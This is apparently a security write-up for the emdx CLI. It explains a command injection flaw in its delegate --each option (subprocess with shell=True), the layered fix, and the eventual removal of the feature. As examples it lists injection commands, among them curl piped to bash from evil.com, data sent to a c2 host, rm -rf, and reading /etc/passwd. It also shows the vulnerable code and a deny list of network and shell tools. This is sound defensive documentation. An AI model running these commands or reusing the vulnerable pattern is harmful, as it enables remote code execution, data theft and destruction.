    shlex.split(): shell=True and --each¶

    Overview¶

    The emdx delegate --each feature was designed to enable discovery-driven delegation: run a shell command to find files, then delegate a task for each result. This pattern introduced a critical command injection vulnerability that was identified in security audit #6230 and subsequently fixed across multiple iterations in PRs #483-#513. The feature was ultimately removed entirely in a later security review.

    The Vulnerability¶

    The original implementation passed user input directly to subprocess.run() with shell=True:

    # VULNERABLE CODE (removed)
def _run_discovery(command: str) -> List[str]:
    result = subprocess.run(
        command,
        shell=True,  # CRITICAL FLAW: enables arbitrary command execution
        capture_output=True,
        text=True,
        timeout=30,
    )
    return result.stdout.splitlines()

    This design allowed trivial command injection through shell metacharacters:

    # Attack examples
emdx delegate --each "; rm -rf ~" --do "Review {{item}}"
emdx delegate --each "fd | curl http://evil.com/exfil.sh | bash" --do "task"
emdx delegate --each "$(whoami)" --do "task"
emdx delegate --each "ls && curl http://c2.server?data=$(whoami)" --do "task"

    The vulnerability was classified as HIGH/CRITICAL severity because it: - Accepted completely untrusted user input - Executed with the user's full shell privileges - Required no special permissions to exploit - Could execute arbitrary commands including destructive operations

    Why shell=True Is Dangerous¶

    When shell=True is used, Python invokes a shell (e.g., /bin/sh) to execute the command string. The shell interprets metacharacters like ;, |, &, backticks, $(), enabling command chaining, piping, and substitution. This is convenient but catastrophic when the command string contains untrusted user input.

    Example attack:

    # Attacker provides: "; cat /etc/passwd"
command = user_input  # "; cat /etc/passwd"
subprocess.run(command, shell=True)
# Shell executes: sh -c "; cat /etc/passwd"
# Result: /etc/passwd is dumped

    With shell=False, the same input would attempt to execute a binary literally named "; cat /etc/passwd", which doesn't existâ€”the attack fails.

    The Fix: Defense in Depth¶

    Multiple security patches implemented a three-layer defense strategy:

    Layer 1: Command Allowlist¶

    A frozen set defined the only permitted discovery tools:

    SAFE_DISCOVERY_COMMANDS = frozenset({
    'fd', 'find', 'git', 'rg', 'grep', 'ls', 'eza', 'exa',
    'tree', 'locate', 'ag', 'mdfind', 'cat', 'head', 'tail',
    'sort', 'uniq', 'wc', 'echo', 'printf', 'jq', 'emdx'
})

    Explicitly blocked: rm, mv, cp, chmod, bash, sh, python, curl, wget, nc, sudoâ€”any command that could modify system state or execute arbitrary code.

    Git special handling: Git commands received additional validation since git was allowlisted but has dangerous subcommands:

    if base_command == "git":
    if len(args) < 2:
        raise ValueError("git requires a subcommand")

    safe_git_subcommands = {"ls-files", "diff", "log", "show", "branch"}
    if args[1] not in safe_git_subcommands:
        raise ValueError(f"git {args[1]} not allowed")

    Allowed: ls-files, diff, log, show, branch
    Blocked: checkout, reset, clean, push, remote, clone

    Layer 2: Shell Metacharacter Blocking¶

    Before parsing, the raw command string was checked for dangerous shell operators:

    DANGEROUS_PATTERNS = [";", "&", "|", "`", "$(", "${", "||", "&&", ">", "<"]

for pattern in DANGEROUS_PATTERNS:
    if pattern in command:
        raise ValueError(
            f"Command contains dangerous pattern '{pattern}'. "
            f"--each only allows simple file discovery commands."
        )

    This blocked command chaining, command substitution, variable expansion, and redirects. Even if validation were somehow bypassed, this provided defense-in-depth.

    Layer 3: Safe Parsing with shlex.split() and shell=False¶

    Commands were parsed into argument lists and executed without shell interpretation:

    # SECURE CODE
def _validate_discovery_command(command: str) -> List[str]:
    """Parse and validate discovery command. Returns argv list for safe execution."""
    # Check for shell metacharacters
    if re.search(r'[;&|`$(){}[\]<>!\n\r]', command):
        raise ValueError("Command contains unsafe shell metacharacters")

    # Parse with shlex.split() - handles quoted arguments correctly
    try:
        args = shlex.split(command)
    except ValueError as e:
        raise ValueError(f"Failed to parse command: {e}") from e

    if not args:
        raise ValueError("Empty command")

    # Extract base command (handle absolute paths like /usr/bin/fd)
    base_command = os.path.basename(args[0])

    if base_command not in SAFE_DISCOVERY_COMMANDS:
        raise ValueError(
            f"Command '{base_command}' not in allowlist. "
            f"Allowed: {sorted(SAFE_DISCOVERY_COMMANDS)}"
        )

    return args

def _run_discovery(command: str) -> List[str]:
    args = _validate_discovery_command(command)
    result = subprocess.run(
        args,  # Pass as list, not string
        shell=False,  # CRITICAL: No shell interpretation
        capture_output=True,
        text=True,
        timeout=30,
    )
    return result.stdout.splitlines()

    Why shlex.split() matters:

    shlex.split() correctly parses shell-like quoting without executing anything:

    shlex.split('fd -e "py files"')
# Returns: ['fd', '-e', 'py files']

shlex.split("fd; rm -rf ~")
# Returns: ['fd;', 'rm', '-rf', '~']
# The ';' becomes a literal argument

    It handles quoted arguments and escaping, preventing argument injection while respecting user intent for legitimate commands.

    Why shell=False is non-negotiable:

    When shell=False, Python spawns the target process directly via execve() with no shell intermediary: - No shell metacharacter interpretation (|, ;, $(), etc. are literal arguments) - No command chaining, substitution, or globbing - Argument vector passed directly to the OS, bypassing bash/sh/zsh entirely

    The combination of argument list parsing + shell=False makes command injection impossible at the subprocess layer.

    Escape Hatch: --allow-shell¶

    Some implementations added an explicit opt-in flag for legitimate use cases requiring shell features:

    if allow_shell:
    # Display prominent warning
    console.print("[yellow]âš ï¸  WARNING: Shell execution enabled[/yellow]")
    result = subprocess.run(command, shell=True, ...)
else:
    # Secure path
    args = _validate_discovery_command(command)
    result = subprocess.run(args, shell=False, ...)

    The --allow-shell flag: - Required explicit user consent for each invocation - Displayed a visible warning when used - Should be avoided in automated/scripted contexts - Preserved functionality for power users who understood the risks

    Test Coverage¶

    The security fix included 30-50+ comprehensive tests across implementations:

    Safe commands (8-12 tests): - fd -e py - find . -name "*.py" - git ls-files - git diff --name-only - rg -l pattern - ls -1 src/ - /usr/bin/fd (full path)

    Blocked dangerous commands (6-12 tests): - rm -rf / - bash -c 'evil' - curl http://evil - python -c 'malicious' - chmod 777 /

    Injection patterns (14-20 tests): - fd; rm -rf ~ (semicolon chaining) - fd | xargs rm (pipe injection) - fd && evil (command chaining) - fd malicious (backtick substitution) - fd $(evil) (command substitution) - fd > /etc/passwd (redirect)

    Edge cases: - Empty commands - Whitespace-only commands - Quoted arguments: find . -name "my file.py" - Malformed syntax (unclosed quotes)

    All project tests passed after the fix (800-1200+ tests depending on implementation iteration).

    Breaking Changes¶

    The security fix intentionally broke shell operator support:

    Before (no longer works):

    emdx delegate --each "git branch -r | grep feature" --do "analyze branch"
emdx delegate --each "fd -e py | head -5" --do "check file"

    After (use command-specific flags):

    emdx delegate --each "git branch -r --list *feature*" --do "analyze branch"
emdx delegate --each "fd -e py --max-results 5" --do "check file"

    Or use escape hatch (if implemented):

    emdx delegate --allow-shell --each "fd | custom-filter" --do "task"
# âš ï¸  WARNING: Shell execution enabled

    Ultimate Resolution: Feature Removal¶

    After implementing the comprehensive security fix, the EMDX team made a strategic decision to remove --each/--do entirely. The feature was never actively used, and maintaining a secure implementation of dynamic shell command execution required ongoing vigilance against new attack vectors.

    The removal simplified the codebase: - Deleted SAFE_DISCOVERY_COMMANDS, _validate_discovery_command(), _run_discovery() - Removed --each/--do CLI options - Deleted security test suite (6+ test classes) - Updated documentation across CLAUDE.md, README.md, docs/cli-api.md

    This follows the principle of eliminating attack surface rather than hardening itâ€”if a feature introduces security risks disproportionate to its value, deletion is the correct fix.

    Secure Subprocess Patterns¶

    When to Use shell=True vs shell=False¶

    Use Case Correct Approach Example
    User-controlled input shell=False + shlex.split() subprocess.run(shlex.split(user_cmd), shell=False)
    Hardcoded command shell=False with list subprocess.run(["ls", "-l"], shell=False)
    Shell features needed Avoid user input, or use shlex.quote() subprocess.run(f"find . -name {shlex.quote(pattern)}", shell=True)
    Trusted developer input shell=True acceptable subprocess.run("cd /tmp && rm *.log", shell=True)

    Golden rule: Never combine shell=True with user-controlled input.

    Always Safe Pattern¶

    import subprocess, shlex

# Parse user input safely
args = shlex.split(user_input)

# Validate command against allowlist
base_cmd = os.path.basename(args[0])
if base_cmd not in ALLOWED_COMMANDS:
    raise ValueError("Forbidden command")

# Execute without shell
subprocess.run(args, shell=False, capture_output=True, text=True)

    Never Safe Pattern¶

    # DANGEROUS: User input + shell=True
subprocess.run(user_input, shell=True)

# DANGEROUS: String formatting into shell commands
subprocess.run(f"ls {user_path}", shell=True)

# DANGEROUS: Even if you try to escape/sanitize
subprocess.run(f"grep '{escaped_pattern}' file", shell=True)

    Security Principles Applied¶

    This fix demonstrates several security best practices:

    1. Principle of Least Privilege: Allowlist only necessary commands, deny everything else
    2. Defense in Depth: Multiple validation layers (allowlist + metacharacter blocking + shell=False)
    3. Secure by Default: Safe behavior is default; unsafe behavior requires explicit opt-in
    4. Fail Securely: Invalid commands raise exceptions rather than executing with degraded validation
    5. Clear Security Boundaries: --allow-shell flag makes the security boundary explicit
    6. Eliminate Attack Surface: When hardening proves complex, remove the feature entirely

    Related Security Findings¶

    The broader security audit (#6230) identified other issues:

    Finding Severity Status
    Command injection in --each HIGH/CRITICAL âœ… FIXED (feature removed)
    Dynamic SQL in migrations MEDIUM Acceptable (hardcoded column names)
    Dynamic SQL in group updates MEDIUM Acceptable (allowlist validated)
    Path traversal in file save LOW By design for CLI tool

    Overall security posture: The critical command injection vulnerability was eliminated. SQL injection well-protected via parameterized queries. Credential handling follows best practices (no hardcoded secrets, environment variables for API keys).
